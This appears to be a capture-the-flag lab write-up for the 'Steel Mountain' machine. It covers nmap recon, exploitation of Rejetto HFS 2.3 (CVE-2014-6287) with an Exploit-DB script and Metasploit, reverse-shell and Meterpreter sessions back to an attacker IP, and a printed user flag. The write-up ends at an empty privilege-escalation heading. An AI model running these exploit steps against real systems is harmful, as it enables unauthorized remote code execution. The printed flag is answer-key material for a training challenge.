# Steel Mountain

IP = `10.10.0.238`

## Recon

```
# Nmap 7.94SVN scan initiated Wed Sep  4 21:55:56 2024 as: nmap --open -sC -sV -oN nmap/initial 10.10.0.238
Nmap scan report for 10.10.0.238
Host is up (0.49s latency).
Not shown: 926 closed tcp ports (reset), 64 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-09-04T16:28:04+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-09-03T16:25:39
|_Not valid after:  2025-03-05T16:25:39
|_ssl-date: 2024-09-04T16:28:12+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-09-04T16:28:04
|_  start_date: 2024-09-04T16:25:28
| smb2-security-mode:
|   3:0:2:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:3f:71:b6:b0:99 (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  4 21:58:14 2024 -- 1 IP address (1 host up) scanned in 137.65 seconds

```



## Initial Foothold

```
searchsploit hfs 2.3
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)       | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)       | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasp | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload    | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution ( | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution ( | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Ex | windows/webapps/34852.txt
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

`searchsploit -m windows/remote/49584.py`

vulnerability : `(CVE-2014-6287)`

change the remote and local ip and port
```
--SNIP--
lhost = "10.4.96.175"
lport = 9898
rhost = "10.10.0.238"
rport = 8080
--SNIP--
```

`python3 49584.py`

```
--SNIP--
connect to [10.4.96.175] from (UNKNOWN) [10.10.0.238] 49277

PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

```

**OR**

```
msf6> use exploit/windows/http/rejetto_hfs_exec

msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.4.96.175
LHOST => 10.4.96.175
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set TARGETURI /
TARGETURI => /
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.4.96.175:4444
[*] Using URL: http://10.4.96.175:8080/VNvGXkBMY3
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /VNvGXkBMY3
[*] Sending stage (176198 bytes) to 10.10.0.238
[!] Tried to delete %TEMP%\daMMcAGAE.vbs, unknown result
[*] Meterpreter session 1 opened (10.4.96.175:4444 -> 10.10.0.238:49312) at 2024-09-04 23:11:30 +0530
[*] Server stopped.

meterpreter >

```

Got User!

user flag found at `C:\Users\bill\Desktop`

**User Flag**
`b04763b6fcf51fcd7c13abc7db4fd365`

## Privilege Escaltion

